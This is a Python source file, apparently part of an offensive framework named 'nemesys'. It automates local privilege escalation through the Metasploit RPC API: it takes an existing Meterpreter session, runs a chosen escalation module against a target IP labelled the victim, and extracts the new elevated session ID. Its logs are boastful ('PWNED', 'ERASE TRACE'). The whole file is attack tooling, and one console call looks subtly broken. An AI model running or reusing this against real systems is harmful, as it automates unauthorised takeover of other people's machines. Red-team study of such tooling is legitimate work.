import re
import time
from utils.logger import nemesysLogger

class PrivilegeEscalationManager:
    """
    Manages local privilege escalation exploits in an active Meterpreter session.

    Handles the automation of executing a local privilege escalation module, monitors output,
    and attempts to grab a new session ID upon successful exploitation.

    Attributes:
        client (MetasploitClient): Instance of the Metasploit RPC client.
        timeout (int): Wait time for exploit execution to complete.
    """

    def __init__(self, client, timeout=30):
        """
        Initialize with Metasploit client and timeout.

        Args:
            client (MetasploitClient): Metasploit RPC client instance.
            timeout (int, optional): Timeout in seconds for exploit execution. Default is 30.
        """
        self.client = client
        self.timeout = timeout

    def run(self, session_id, exploit_name, target):
        """
        Executes the exploit and attempts to extract the new Meterpreter session ID.

        Args:
            session_id (int): Current session ID for privilege escalation.
            exploit_name (str): Exploit module to be used for privilege escalation.
            target (str): IP address of the target (victim).

        Returns:
            int or None: New session ID if successful, else `None`.
        """
        console_id = self.client.consoles.console().cid
        new_session_id = None
        current_console = self.client.consoles.console(console_id)
        try:
            nemesysLogger.info("🦠 [INFECT] Deployment initiated.")
            nemesysLogger.debug(f"📡 [SIGNAL] Module '{exploit_name}' targeting {target}")

            # Setup exploit module
            current_console.write(f'use {exploit_name}\n')
            current_console.write(f'set SESSION {session_id}\n')
            current_console.write(f'set RHOSTS {target}\n')

            nemesysLogger.info("💉 [PAYLOAD] Injecting malicious code into the system veins...")
            current_console.console(console_id).write('run\n')

            # Wait for the exploit to take effect
            time.sleep(self.timeout)

            output = current_console.read()
            escalation_output = output.get('data', '')

            # Extract new session ID
            if "Meterpreter session" in escalation_output:
                match = re.search(r'Meterpreter session (\d+) opened', escalation_output)
                if match:
                    new_session_id = int(match.group(1))
                    nemesysLogger.info(f"🕳️ [PWNED] Access granted. New session ID: {new_session_id}")
                else:
                    nemesysLogger.warning("🔍 [LOST SIGNAL] Session ID not found. Phantom session?")
            elif "Post module execution completed" in escalation_output:
                nemesysLogger.info("💀 [NULL RESPONSE] Payload executed, no session detected.")
            elif "Exploit failed" in escalation_output or "No session was created" in escalation_output:
                nemesysLogger.error("🛑 [DEAD END] Exploit failed. Target remains fortified.")
            else:
                nemesysLogger.warning("🌀 [GLITCH] Unexpected output.")

        except Exception as e:
            nemesysLogger.error(f"🔥 [EXCEPTION] Exploit crashed: {e}")
            raise

        finally:
            # Cleanup console session
            current_console.destroy()
            nemesysLogger.info("🧩 [ERASE TRACE] Console session terminated. Logs fragmented.")

        return new_session_id